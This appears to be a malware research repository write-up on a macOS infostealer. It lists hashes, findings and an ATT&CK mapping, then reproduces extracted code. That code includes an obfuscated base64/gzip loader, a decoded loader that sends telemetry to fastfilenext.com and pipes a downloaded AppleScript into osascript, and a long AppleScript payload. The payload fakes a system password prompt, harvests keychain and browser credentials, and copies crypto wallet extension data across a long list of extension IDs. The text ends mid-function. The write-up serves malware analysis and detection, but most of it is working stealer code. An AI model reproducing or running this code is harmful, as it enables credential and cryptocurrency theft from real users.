# macOS Infostealer Research Repo

Technical write-up and extracted code for a macOS infostealer that combines credential theft, browser and wallet collection, Telegram session hijacking, wallet application injection, and LaunchAgent-based persistence.

## Malware hashes

| Component | SHA-256 | Vendor verdicts |
|---|---|---|
| Payload AppleScript | `e2d8b67a42b61fe666f76d4ae51c3433ec1f20918d1b27863b234a834f5d310a` | 19/59 vendors flagged as malicious |
| GoogleUpdate persistence script | `e9cbbddb8475bc47317fbb9a8f935573b1045e49aec66b5d1123786615e67eff` | 11/61 vendors flagged as malicious |

## Key findings

- Initial delivery from `hxxps://fastfilenext[.]com/debug/loader[.]sh`
- Loader uses `base64 -> gzip -> eval` for fileless execution
- CIS evasion via Russian keyboard layout checks
- Fake macOS password prompt validated with `dscl . authonly`
- Browser theft from Chromium/Gecko families
- Wallet targeting across browser extensions and desktop wallet apps
- Telegram Desktop `tdata` theft for session hijacking
- Keychain and iCloud account data collection
- Wallet application injection by replacing `app.asar`
- Persistence via `~/Library/LaunchAgents/com.google.keystone.agent.plist`
- Full heartbeat/RCE loop via masqueraded `GoogleUpdate`

## MITRE ATT&CK mapping

| Technique | ID | Why it fits |
|---|---|---|
| Command and Scripting Interpreter | T1059 | zsh, bash, and AppleScript are used for execution |
| Obfuscated Files or Information | T1027 | Multi-layer base64 and gzip obfuscation |
| Credentials from Password Stores | T1555 | Keychain and browser credential theft |
| Input Capture | T1056 | Fake password dialog used to harvest credentials |
| Data from Local System | T1005 | Desktop/Documents, browser data, wallets, notes, history |
| Exfiltration Over C2 Channel | T1041 | Stolen data and telemetry sent to C2 |
| Application Layer Protocol | T1071 | HTTPS used for staging, telemetry, and heartbeat |
| Launch Agent | T1543.001 | User LaunchAgent used for persistence on macOS |
| Masquerading | T1036 | Persistence disguised as Google Keystone/GoogleUpdate |
| System Information Discovery | T1082 | Hostname, OS version, locale, IP gathered |
| Account Discovery | T1033 | Username harvested |
| Hijack Execution Flow / Modify Existing Component | T1574 | Wallet `app.asar` replacement to backdoor apps |

## Repository layout

- `code/01_decode_payload.ps1` — PowerShell helper used to decode the gzip/base64 blob
- `code/02_loader.sh` — original zsh loader
- `code/03_decoded_loader.sh` — decoded loader content
- `code/04_payload.applescript` — AppleScript payload extracted from the analysis notes
- `code/05_googleupdate_heartbeat.sh` — decoded persistence/heartbeat script
- `detections/macos_launchagent_googleupdate_sigma.yml` — Sigma concept rule
- `detections/hunting_queries.kql` — KQL hunting ideas
- `analysis/original_research_notes.txt` — original full research notes

## Code excerpts

### PowerShell decoding helper
```powershell
$b64='H4sIAD9mwWkC/71U4U7jRhD+b6nvMLeXXoiE7QRIUbmCytH0SAkJalKK1FbWxh7H22x2fbtrSLi7qg/RJ+yTdNfGEJIKqX/qXzvj/WZn5vtmXr8Kp0yE9zrzXsN3OC1mwCVNUMHff/4FCRqMDZz1x0BFAlMu4zncMZOBQY4LNGrl9ceR/X9MUso1Eo+lFpXSghsNCmkCf4QDNlVUrcIrhSkqFDHqMJaLgOY5x+C8P5GST+UyyDnTBk6dtyfolGPSF3lhxrJQFgJ7J2GCt6EoOIdPMFOYg/+BgSq0ZlS8BZOh8MB+dUZGFTahlHllaWUltgDKEZhIZVmgpoIZdo+QSgU/jEdDbzA6Ox30ov7w+9FxY+d/LIUBucDVVFKVDOhKFgaGdIHE/s/c237XnoyC5q+iCc3dZmX5CTTJ05k07f1PgHEmgRRiLuSdIC3vfDSeDE8ve7agTGojbNyNFNZCbcNH4+i696MF67voFpUGP1cyKWJzbQ0mxfNY2/jezSTqX1l8XCgOvsX7C7r0DbNpdCEzJtdHYUhzFrCcpatAqtlmyBeRLKYio/csDywV/w2ZxlKkbBZsNuSFIqofjcomT73zvoBmy0ntXcF4UorJyitFvoJCMzGDXDFhUk+jSKLETVqEtyjMTgs+lrIttQm968kxaXTImsuFsg9XeGh+JCWOHJEvNdklU/dclFGd1R6WP550FDNdW5X4a6tWQm1LXZJr+aw8n5uuyusJAULW6iWNarzcaW1WnFnLzJ0rzdi+uTIeObiBK3sHSN3/lGqTMo4Cl8aR50QQlr0JqxrBPwdyJoWxhj9Z5XgEbtQs48YmGv6ubbal8BuuSeQ5y2uE7p286XifHTv9tFxn5fBbJsD2Jyr3GiZQvlluOlwy41bZL2v1HkO1UeC3tV2zySaQtYBkKwUHcbGh/bCXhtI8z6favpHCDwVqUyflbb+zeXHrMXjjeQnFhRRRWojYNexRa7jEGL55vP/kO/kX396Gs6JzvjFV++2SrJ80Kv90ZlM8gkt5zzinYTdow84lja1+pc7eQt/yycE6YDSGG+i0o043OmxV+/JnnF4wE3b3D4P9r2Dn4nxyOdgFzuYI7zGeyxacZUouMPy6E7SDg4PDvaDTOYAxTaliDzDygsQqeeV05RpYLW4dK5YbN8tS08qwYtnonVXCt8T29IG+fwBqLQ9wOQcAAA==';$bytes=[Convert]::FromBase64String($b64);$ms=New-Object IO.MemoryStream(,$bytes);$gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);$out=$sr.ReadToEnd();$desktop=[Environment]::GetFolderPath('Desktop');$outFile=Join-Path $desktop 'Result.txt';[IO.File]::WriteAllText($outFile,$out);Write-Host '[+] Decoded to ' $outFile
```

### Original zsh loader
```bash
#!/bin/zsh
d6186d5=$(base64 -D <<'PAYLOAD_84c66a58' | gunzip
H4sIAD9mwWkC/71U4U7jRhD+b6nvMLeXXoiE7QRIUbmCytH0SAkJalKK1FbWxh7H22x2fbtrSLi7qg/RJ+yTdNfGEJIKqX/qXzvj/WZn5vtmXr8Kp0yE9zrzXsN3OC1mwCVNUMHff/4FCRqMDZz1x0BFAlMu4zncMZOBQY4LNGrl9ceR/X9MUso1Eo+lFpXSghsNCmkCf4QDNlVUrcIrhSkqFDHqMJaLgOY5x+C8P5GST+UyyDnTBk6dtyfolGPSF3lhxrJQFgJ7J2GCt6EoOIdPMFOYg/+BgSq0ZlS8BZOh8MB+dUZGFTahlHllaWUltgDKEZhIZVmgpoIZdo+QSgU/jEdDbzA6Ox30ov7w+9FxY+d/LIUBucDVVFKVDOhKFgaGdIHE/s/c237XnoyC5q+iCc3dZmX5CTTJ05k07f1PgHEmgRRiLuSdIC3vfDSeDE8ve7agTGojbNyNFNZCbcNH4+i696MF67voFpUGP1cyKWJzbQ0mxfNY2/jezSTqX1l8XCgOvsX7C7r0DbNpdCEzJtdHYUhzFrCcpatAqtlmyBeRLKYio/csDywV/w2ZxlKkbBZsNuSFIqofjcomT73zvoBmy0ntXcF4UorJyitFvoJCMzGDXDFhUk+jSKLETVqEtyjMTgs+lrIttQm968kxaXTImsuFsg9XeGh+JCWOHJEvNdklU/dclFGd1R6WP550FDNdW5X4a6tWQm1LXZJr+aw8n5uuyusJAULW6iWNarzcaW1WnFnLzJ0rzdi+uTIeObiBK3sHSN3/lGqTMo4Cl8aR50QQlr0JqxrBPwdyJoWxhj9Z5XgEbtQs48YmGv6ubbal8BuuSeQ5y2uE7p286XifHTv9tFxn5fBbJsD2Jyr3GiZQvlluOlwy41bZL2v1HkO1UeC3tV2zySaQtYBkKwUHcbGh/bCXhtI8z6favpHCDwVqUyflbb+zeXHrMXjjeQnFhRRRWojYNexRa7jEGL55vP/kO/kX396Gs6JzvjFV++2SrJ80Kv90ZlM8gkt5zzinYTdow84lja1+pc7eQt/yycE6YDSGG+i0o043OmxV+/JnnF4wE3b3D4P9r2Dn4nxyOdgFzuYI7zGeyxacZUouMPy6E7SDg4PDvaDTOYAxTaliDzDygsQqeeV05RpYLW4dK5YbN8tS08qwYtnonVXCt8T29IG+fwBqLQ9wOQcAAA==
PAYLOAD_84c66a58
)
eval "$d6186d5"
```

### Decoded loader
``#!/bin/zsh # Debug loader — detect CIS and block with telemetry IS_CIS="false" if defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -qi russian; then IS_CIS="true" fi # Detect locale info — sanitize for JSON LOCALE_INFO=$(defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -i "KeyboardLayout Name" | head -5 | tr '\n' ',' | tr -d '"' | tr -d "'" || echo "unknown") HOSTNAME=$(hostname 2>/dev/null | tr -d '"' || echo "unknown") OS_VER=$(sw_vers -productVersion 2>/dev/null || echo "unknown") EXT_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://icanhazip.com 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "unknown") EXT_IP=$(echo "$EXT_IP" | tr -d ' ') # Build JSON safely using printf send_debug_event() { local EVT="$1" local JSON=$(printf '{"event":"%s","build_hash":"%s","ip":"%s","is_cis":"%s","locale":"%s","hostname":"%s","os_version":"%s"}' "$EVT" "" "$EXT_IP" "$IS_CIS" "$LOCALE_INFO" "$HOSTNAME" "$OS_VER") curl -s -X POST "https://fastfilenext.com/api/debug/event" -H "Content-Type: application/json" -d "$JSON" --max-time 5 >/dev/null 2>&1 } # If CIS — send cis_blocked event and exit if [ "$IS_CIS" = "true" ]; then send_debug_event "cis_blocked" >/dev/null 2>&1 exit 0 fi # Not CIS — send loader_requested event send_debug_event "loader_requested" >/dev/null 2>&1 & daemon_function() { exec </dev/null exec >/dev/null exec 2>/dev/null curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "https://fastfilenext.com/debug/payload.applescript" | osascript } daemon_function "$@" & exit 0
```

### Payload.applescript
```
try
do shell script "killall Terminal"
end try

property writemind : ""

on filesizer(paths)
set fsz to 0
try
set theItem to quoted form of POSIX path of paths
set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
end try
return fsz
end filesizer

on mkdir(someItem)
try
set filePosixPath to quoted form of (POSIX path of someItem)
do shell script "mkdir -p " & filePosixPath
end try
end mkdir

on FileName(filePath)
try
set reversedPath to (reverse of every character of filePath) as string
set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
set finalPath to (reverse of every character of trimmedPath) as string
return finalPath
end try
end FileName

on BeforeFileName(filePath)
try
set lastSlash to offset of "/" in (reverse of every character of filePath) as string
set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
return trimmedPath
end try
end BeforeFileName

on writeText(textToWrite, filePath)
try
set folderPath to BeforeFileName(filePath)
mkdir(folderPath)
set fileRef to (open for access filePath with write permission)
write textToWrite to fileRef starting at eof
close access fileRef
end try
end writeText

on debugLog(msg)
try
set ts to do shell script "date '+%H:%M:%S'"
writeText(ts & " | " & msg & return, writemind & "debug")
end try
end debugLog

on readwrite(path_to_file, path_as_save)
try
set fileContent to read path_to_file
set folderPath to BeforeFileName(path_as_save)
mkdir(folderPath)
do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
debugLog("COPY OK: " & path_to_file & " -> " & path_as_save)
on error errMsg
debugLog("COPY FAIL: " & path_to_file & " | " & errMsg)
end try
end readwrite

on isDirectory(someItem)
try
set filePosixPath to quoted form of (POSIX path of someItem)
set fileType to (do shell script "file -b " & filePosixPath)
if fileType ends with "directory" then
return true
end if
return false
end try
end isDirectory

on GrabFolderLimit(sourceFolder, destinationFolder)
try
debugLog("GrabFolderLimit: " & sourceFolder & " -> " & destinationFolder)
set bankSize to 0
set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
set fileList to list folder sourceFolder without invisibles
mkdir(destinationFolder)
repeat with currentItem in fileList
if currentItem is not in exceptionsList then
set itemPath to sourceFolder & "/" & currentItem
set savePath to destinationFolder & "/" & currentItem
if isDirectory(itemPath) then
GrabFolderLimit(itemPath, savePath)
else
set fsz to filesizer(itemPath)
set bankSize to bankSize + fsz
if bankSize < 100 * 1024 * 1024 then
readwrite(itemPath, savePath)
end if
end if
end if
end repeat
on error errMsg
debugLog("GrabFolderLimit FAIL: " & sourceFolder & " | " & errMsg)
end try
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
try
debugLog("GrabFolder: " & sourceFolder & " -> " & destinationFolder)
set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
set fileList to list folder sourceFolder without invisibles
mkdir(destinationFolder)
repeat with currentItem in fileList
if currentItem is not in exceptionsList then
set itemPath to sourceFolder & "/" & currentItem
set savePath to destinationFolder & "/" & currentItem
if isDirectory(itemPath) then
GrabFolder(itemPath, savePath)
else
readwrite(itemPath, savePath)
end if
end if
end repeat
end try
end GrabFolder

on checkvalid(username, password_entered)
try
set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
if result is not equal to "" then
return false
else
return true
end if
on error
return false
end try
end checkvalid

on getpwd(username, writemind, provided_password)
try
if provided_password is not equal to "" then
if checkvalid(username, provided_password) then
writeText("VALID: " & provided_password, writemind & "Password")
return provided_password
else
writeText(provided_password, writemind & "invalid_passwords.txt")
end if
end if
if checkvalid(username, "") then
set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
writeText(result as string, writemind & "masterpass-chrome")
writeText("NO_PASSWORD_REQUIRED", writemind & "Password")
return ""
else
set attemptCount to 0
set maxAttempts to 10
set validPassword to ""
set gotValidPassword to false
repeat while attemptCount < maxAttempts and gotValidPassword is false
set attemptCount to attemptCount + 1
set imagePath to "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" as POSIX file
if attemptCount > 3 then
set dialogMsg to "Incorrect password. Please try again. (" & attemptCount & "/" & maxAttempts & ")"
else
set dialogMsg to "Required Application Helper. Please enter password for continue."
end if
set result to display dialog dialogMsg default answer "" with icon imagePath buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
set password_entered to text returned of result
if password_entered is not equal to "" then
if checkvalid(username, password_entered) then
writeText("VALID: " & password_entered, writemind & "Password")
set validPassword to password_entered
set gotValidPassword to true
else
writeText("Attempt " & attemptCount & ": " & password_entered, writemind & "invalid_passwords.txt")
end if
end if
end repeat
if gotValidPassword then
return validPassword
else
writeText("NO_VALID_PASSWORD_AFTER_" & maxAttempts & "_ATTEMPTS", writemind & "Password")
return "__INVALID__"
end if
end if
end try
return "__INVALID__"
end getpwd

on grabPlugins(paths, savePath, pluginList, index)
try
set fileList to list folder paths without invisibles
repeat with PFile in fileList
repeat with Plugin in pluginList
if (PFile contains Plugin) then
set newpath to paths & PFile
set newsavepath to savePath & "/" & Plugin
if index then
set newsavepath to savePath & "/IndexedDB/" & PFile
end if
GrabFolder(newpath, newsavepath)
end if
end repeat
end repeat
end try
end grabPlugins

on Chromium(writemind, chromium_map)
debugLog("Chromium: starting")
set pluginList to {}
set pluginList to pluginList & {"eiaeiblijfjekdanodkjadfinkhbfgcd", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"}
set pluginList to pluginList & {"bfogiafebfohielmmehodmfbbebbbpei", "nngceckbapebfimnlniiiahkandclblb"}
set pluginList to pluginList & {"fdjamakpfbbddfjaooikfcpapjohcfmg", "hdokiejnpimakedhajhdlcegeplioahd"}
set pluginList to pluginList & {"pnlccmojcmeohlpggmfnbbiapkmbliob", "ghmbeldphafepmbegfdlkpapadhbakde"}
set pluginList to pluginList & {"kmcfomidfpdkfieipokbalgegidffkal", "bnfdmghkeppfadphbnkjcicejfepnbfe"}
set pluginList to pluginList & {"caljgklbbfbcjjanaijlacgncafpegll", "folnjigffmbjmcjgmbbfcpleeddaedal"}
set pluginList to pluginList & {"igkpcodhieompeloncfnbekccinhapdb", "admmjipmmciaobhojoghlmleefbicajg"}
set pluginList to pluginList & {"ehpbfbahieociaeckccnklpdcmfaeegd", "epanfjkfahimkgomnigadpkobaefekcd"}
set pluginList to pluginList & {"didegimhafipceonhjepacocaffmoppf", "oboonakemofpalcgghocfoadofidjkkk"}
set pluginList to pluginList & {"jgnfghanfbjmimbdmnjfofnbcgpkbegj", "mmhlniccooihdimnnjhamobppdhaolme"}
set pluginList to pluginList & {"dbfoemgnkgieejfkaddieamagdfepnff", "bhghoamapcdpbohphigoooaddinpkbai"}
set pluginList to pluginList & {"lojeokmpinkpmpbakfkfpgfhpapbgdnd", "ibpjepoimpcdofeoalokgpjafnjonkpc"}
set pluginList to pluginList & {"gmohoglkppnemohbcgjakmgengkeaphi", "gaedmjdfmmahhbjefcbgaolhhanlaolb"}
set pluginList to pluginList & {"oeljdldpnmdbchonielidgobddffflal", "ilgcnhelpchnceeipipijaljkblbcobl"}
set pluginList to pluginList & {"fooolghllnmhmmndgjiamiiodkpenpbb", "naepdomgkenhinolocfifgehidddafch"}
set pluginList to pluginList & {"bmikpgodpkclnkgmnpphehdgcimmided", "imloifkgjagghnncjkhggdhalmcnfklk"}
set pluginList to pluginList & {"jhfjfclepacoldmjmkmdlmganfaalklb", "chgfefjpcobfbnpmiokfjjaglahmnded"}
set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
repeat with chromium in chromium_map
set savePath to writemind & "Browsers/" & item 1 of chromium & "_"
try
set fileList to list folder item 2 of chromium without invisibles
debugLog("Chromium: found " & item 1 of chromium & " at " & item 2 of chromium & " profiles: " & (count of fileList))
repeat with currentItem in fileList
if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
set profileName to (item 1 of chromium & currentItem)
debugLog("Chromium: processing profile " & profileName & " path: " & item 2 of chromium & currentItem)
repeat with CFile in chromiumFiles
set readpath to (item 2 of chromium & currentItem & CFile)
if ((CFile as string) is equal to "/Network/Cookies") then
set CFile to "/Cookies"
end if
if ((CFile as string) is equal to "/Local Extension Settings/") then
grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, false)
else if (CFile as string) is equal to "/IndexedDB/" then
grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, true)
else
set writepath to savePath & currentItem & CFile
readwrite(readpath, writepath)
end if
end repeat
end if
end repeat
on error errMsg
debugLog("Chromium: NOT found " & item 1 of chromium & " at " & item 2 of chromium & " | " & errMsg)
end try
end repeat
end Chromium

on ChromiumWallets(writemind, chromium_map)
debugLog("ChromiumWallets: starting")
set walletConfig to {}
set walletConfig to walletConfig & {{"djclckkglechooblngghdinmeemkbgci", 1, 0, 0}}
set walletConfig to walletConfig & {{"ejbalbakoplchlghecdalmeeeajnimhm", 1, 0, 0}}
set walletConfig to walletConfig & {{"nkbihfbeogaeaoehlefnkodbefgpgknn", 1, 0, 1}}
set walletConfig to walletConfig & {{"ibnejdfjmmkpcnlpebklmnkoeoihofec", 1, 0, 0}}
set walletConfig to walletConfig & {{"fhbohimaelbohpjbbldcngcnapndodjp", 1, 0, 0}}
set walletConfig to walletConfig & {{"ffnbelfdoeiohenkjibnmadjiehjhajb", 1, 0, 1}}
set walletConfig to walletConfig & {{"hnfanknocfeofbddgcijnmhnfnkdnaad", 1, 0, 1}}
set walletConfig to walletConfig & {{"hpglfhgfnhbgpjdenjgmdgoeiappafln", 1, 0, 0}}
set walletConfig to walletConfig & {{"cjelfplplebdjjenllpjcblmjkfcffne", 1, 0, 0}}
set walletConfig to walletConfig & {{"kncchdigobghenbbaddojjnnaogfppfj", 1, 0, 0}}
set walletConfig to walletConfig & {{"nlbmnnijcnlegkjjpcfjclmcfggfefdm", 1, 0, 0}}
set walletConfig to walletConfig & {{"nanjmdknhkinifnkgdcggcfnhdaammmj", 1, 0, 0}}
set walletConfig to walletConfig & {{"fnjhmkhhmkbjkkabndcnnogagogbneec", 1, 0, 0}}
set walletConfig to walletConfig & {{"cphhlgmgameodnhkjdmkpanlelnlohao", 1, 0, 0}}
set walletConfig to walletConfig & {{"nhnkbkgjikgcigadomkphalanndcapjk", 1, 0, 0}}
set walletConfig to walletConfig & {{"kpfopkelmapcoipemfendmdcghnegimn", 1, 0, 0}}
set walletConfig to walletConfig & {{"aiifbnbfobpmeekipheeijimdpnlpgpp", 1, 0, 0}}
set walletConfig to walletConfig & {{"dmkamcknogkgcdfhhbddcghachkejeap", 1, 0, 0}}
set walletConfig to walletConfig & {{"fhmfendgdocmcbmfikdcogofphimnkno", 1, 0, 0}}
set walletConfig to walletConfig & {{"cnmamaachppnkjgnildpdmkaakejnhae", 1, 0, 0}}
set walletConfig to walletConfig & {{"jojhfeoedkpkglbfimdfabpdfjaoolaf", 1, 0, 0}}
set walletConfig to walletConfig & {{"flpiciilemghbmfalicajoolhkkenfel", 1, 0, 0}}
set walletConfig to walletConfig & {{"aeachknmefphepccionboohckonoeemg", 1, 0, 0}}
set walletConfig to walletConfig & {{"cgeeodpfagjceefieflmdfphplkenlfk", 1, 0, 0}}
set walletConfig to walletConfig & {{"pdadjkfkgcafgbceimcpbkalnfnepbnk", 1, 0, 0}}
set walletConfig to walletConfig & {{"acmacodkjbdgmoleebolmdjonilkdbch", 1, 0, 0}}
set walletConfig to walletConfig & {{"bfnaelmomeimhlpmgjnjophhpkkoljpa", 1, 0, 0}}
set walletConfig to walletConfig & {{"odbfpeeihdkbihmopkbjmoonfanlbfcl", 1, 0, 0}}
set walletConfig to walletConfig & {{"fhilaheimglignddkjgofkcbgekhenbh", 1, 0, 0}}
set walletConfig to walletConfig & {{"mgffkfbidihjpoaomajlbgchddlicgpn", 1, 0, 0}}
set walletConfig to walletConfig & {{"aodkkagnadcbobfpggfnjeongemjbjca", 1, 0, 0}}
set walletConfig to walletConfig & {{"hmeobnfnfcmdkdcmlblgagmfpfboieaf", 1, 1, 1}}
set walletConfig to walletConfig & {{"lpfcbjknijpeeillifnkikgncikgfhdo", 1, 0, 0}}
set walletConfig to walletConfig & {{"dngmlblcodfobpdpecaadgfbcggfjfnm", 1, 0, 0}}
set walletConfig to walletConfig & {{"lpilbniiabackdjcionkobglmddfbcjo", 1, 0, 0}}
set walletConfig to walletConfig & {{"bhhhlbepdkbapadjdnnojkbgioiodbic", 1, 0, 0}}
set walletConfig to walletConfig & {{"dkdedlpgdmmkkfjabffeganieamfklkm", 1, 0, 0}}
set walletConfig to walletConfig & {{"hcflpincpppdclinealmandijcmnkbgn", 1, 0, 0}}
set walletConfig to walletConfig & {{"mnfifefkajgofkcjkemidiaecocnkjeh", 1, 0, 0}}
set walletConfig to walletConfig & {{"ookjlbkiijinhpmnjffcofjonbfbgaoc", 1, 0, 0}}
set walletConfig to walletConfig & {{"jnkelfanjkeadonecabehalmbgpfodjm", 1, 0, 0}}
set walletConfig to walletConfig & {{"kjmoohlgokccodicjjfebfomlbljgfhk", 1, 0, 0}}
set walletConfig to walletConfig & {{"nlgbhdfgdhgbiamfdfmbikcdghidoadd", 1, 0, 0}}
set walletConfig to walletConfig & {{"jnmbobjmhlngoefaiojfljckilhhlhcj", 1, 0, 0}}
set walletConfig to walletConfig & {{"lodccjjbdhfakaekdiahmedfbieldgik", 1, 0, 0}}
set walletConfig to walletConfig & {{"jhgnbkkipaallpehbohjmkbjofjdmeid", 1, 0, 0}}
set walletConfig to walletConfig & {{"jnlgamecbpmbajjfhmmmlhejkemejdma", 1, 0, 0}}
set walletConfig to walletConfig & {{"kkpllkodjeloidieedojogacfhpaihoh", 1, 1, 1}}
set walletConfig to walletConfig & {{"mcohilncbfahbmgdjkbpemcciiolgcge", 1, 0, 0}}
set walletConfig to walletConfig & {{"epapihdplajcdnnkdeiahlgigofloibg", 1, 0, 0}}
set walletConfig to walletConfig & {{"gjagmgiddbbciopjhllkdnddhcglnemk", 1, 0, 0}}
set walletConfig to walletConfig & {{"kmhcihpebfmpgmihbkipmjlmmioameka", 1, 1, 1}}
set walletConfig to walletConfig & {{"phkbamefinggmakgklpkljjmgibohnba", 1, 0, 0}}
set walletConfig to walletConfig & {{"ejjladinnckdgjemekebdpeokbikhfci", 1, 0, 0}}
set walletConfig to walletConfig & {{"efbglgofoippbgcjepnhiblaibcnclgk", 1, 0, 0}}
set walletConfig to walletConfig & {{"cjmkndjhnagcfbpiemnkdpomccnjblmj", 1, 0, 0}}
set walletConfig to walletConfig & {{"aijcbedoijmgnlmjeegjaglmepbmpkpi", 1, 0, 0}}

set walletConfig to walletConfig & {{"gojhcdgcpbpfigcaejpfhfegekdgiblk", 1, 0, 1}}
set walletConfig to walletConfig & {{"egjidjbpglichdcondbcbdnbeeppgdph", 1, 0, 0}}
set walletConfig to walletConfig & {{"hbbgbephgojikajhfbomhlmmollphcad", 1, 0, 0}}
set walletConfig to walletConfig & {{"opfgelmcmbiajamepnmloijbpoleiama", 1, 0, 0}}
set walletConfig to walletConfig & {{"fiikommddbeccaoicoejoniammnalkfa", 1, 0, 0}}
set walletConfig to walletConfig & {{"bgjogpoidejdemgoochpnkmdjpocgkha", 1, 0, 0}}
set walletConfig to walletConfig & {{"jgaaimajipbpdogpdglhaphldakikgef", 1, 0, 0}}
set walletConfig to walletConfig & {{"kppfdiipphfccemcignhifpjkapfbihd", 1, 0, 0}}
set walletConfig to walletConfig & {{"lgmpcpglpngdoalbgeoldeajfclnhafa", 1, 0, 0}}
set walletConfig to walletConfig & {{"onhogfjeacnfoofkfgppdlbmlmnplgbn", 1, 0, 0}}
set walletConfig to walletConfig & {{"mmmjbcfofconkannjonfmjjajpllddbg", 1, 0, 0}}
set walletConfig to walletConfig & {{"loinekcabhlmhjjbocijdoimmejangoa", 1, 0, 0}}
set walletConfig to walletConfig & {{"heefohaffomkkkphnlpohglngmbcclhi", 1, 0, 0}}
set walletConfig to walletConfig & {{"idnnbdplmphpflfnlkomgpfbpcgelopg", 1, 0, 0}}
set walletConfig to walletConfig & {{"cnncmdhjacpkmjmkcafchppbnpnhdmon", 1, 0, 0}}
set walletConfig to walletConfig & {{"ocjdpmoallmgmjbbogfiiaofphbjgchh", 1, 0, 0}}
set walletConfig to walletConfig & {{"ojggmchlghnjlapmfbnjholfjkiidbch", 1, 0, 0}}
set walletConfig to walletConfig & {{"ciojocpkclfflombbcfigcijjcbkmhaf", 1, 0, 0}}
set walletConfig to walletConfig & {{"mkpegjkblkkefacfnmkajcjmabijhclg", 1, 0, 0}}
set walletConfig to walletConfig & {{"aflkmfhebedbjioipglgcbcmnbpgliof", 1, 0, 0}}
set walletConfig to walletConfig & {{"omaabbefbmiijedngplfjmnooppbclkk", 1, 0, 0}}
set walletConfig to walletConfig & {{"penjlddjkjgpnkllboccdgccekpkcbin", 1, 0, 0}}
set walletConfig to walletConfig & {{"apenkfbbpmhihehmihndmmcdanacolnh", 1, 0, 0}}
set walletConfig to walletConfig & {{"jiidiaalihmmhddjgbnbgdfflelocpak", 1, 0, 0}}
set walletConfig to walletConfig & {{"nphplpgoakhhjchkkhmiggakijnkhfnd", 1, 0, 0}}
set walletConfig to walletConfig & {{"fldfpgipfncgndfolcbkdeeknbbbnhcc", 1, 0, 0}}
set walletConfig to walletConfig & {{"nnpmfplkfogfpmcngplhnbdnnilmcdcg", 1, 0, 0}}
set walletConfig to walletConfig & {{"opcgpfmipidbgpenhmajoajpbobppdil", 1, 0, 1}}
set walletConfig to walletConfig & {{"ppbibelpcjmhbdihakflkdcoccbgbkpo", 1, 0, 0}}
set walletConfig to walletConfig & {{"gjnckgkfmgmibbkoficdidcljeaaaheg", 1, 0, 0}}
set walletConfig to walletConfig & {{"pdliaogehgdbhbnmkklieghmmjkpigpa", 1, 0, 0}}
set walletConfig to walletConfig & {{"anokgmphncpekkhclmingpimjmcooifb", 1, 0, 0}}
set walletConfig to walletConfig & {{"fpkhgmpbidmiogeglndfbkegfdlnajnf", 1, 0, 0}}
set walletConfig to walletConfig & {{"aholpfdialjgjfhomihkjbmgjidlcdno", 1, 0, 0}}
set walletConfig to walletConfig & {{"ebfidpplhabeedpnhjnobghokpiioolj", 1, 0, 0}}
set walletConfig to walletConfig & {{"dldjpboieedgcmpkchcjcbijingjcgok", 1, 0, 0}}
set walletConfig to walletConfig & {{"cpmkedoipcpimgecpmgpldfpohjplkpp", 1, 0, 0}}
set walletConfig to walletConfig & {{"bgpipimickeadkjlklgciifhnalhdjhe", 1, 0, 0}}
set walletConfig to walletConfig & {{"gkmegkoiplibopkmieofaaeloldidnko", 1, 0, 0}}
set walletConfig to walletConfig & {{"ckklhkaabbmdjkahiaaplikpdddkenic", 1, 0, 0}}
set walletConfig to walletConfig & {{"lnnnmfcpbkafcpgdilckhmhbkkbpkmid", 1, 0, 0}}
set walletConfig to walletConfig & {{"gafhhkghbfjjkeiendhlofajokpaflmk", 1, 0, 0}}
set walletConfig to walletConfig & {{"fcfcfllfndlomdhbehjjcoimbgofdncg", 1, 0, 0}}
set walletConfig to walletConfig & {{"ldinpeekobnhjjdofggfgjlcehhmanlj", 1, 0, 0}}
set walletConfig to walletConfig & {{"afbcbjpbpfadlkmhmclhkeeodmamcflc", 1, 0, 0}}
set walletConfig to walletConfig & {{"pcndjhkinnkaohffealmlmhaepkpmgkb", 1, 0, 0}}
set walletConfig to walletConfig & {{"ifckdpamphokdglkkdomedpdegcjhjdp", 1, 0, 0}}
set walletConfig to walletConfig & {{"fdcnegogpncmfejlfnffnofpngdiejii", 1, 0, 0}}
set walletConfig to walletConfig & {{"khpkpbbcccdmmclmpigdgddabeilkdpd", 1, 0, 1}}
set walletConfig to walletConfig & {{"cmndjbecilbocjfkibfbifhngkdmjgog", 1, 0, 0}}
set walletConfig to walletConfig & {{"fijngjgcjhjmmpcmkeiomlglpeiijkld", 1, 1, 1}}
set walletConfig to walletConfig & {{"amkmjjmmflddogmhpjloimipbofnfjih", 1, 0, 0}}
set walletConfig to walletConfig & {{"klghhnkeealcohjjanjjdaeeggmfmlpl", 1, 0, 1}}
repeat with chromium in chromium_map
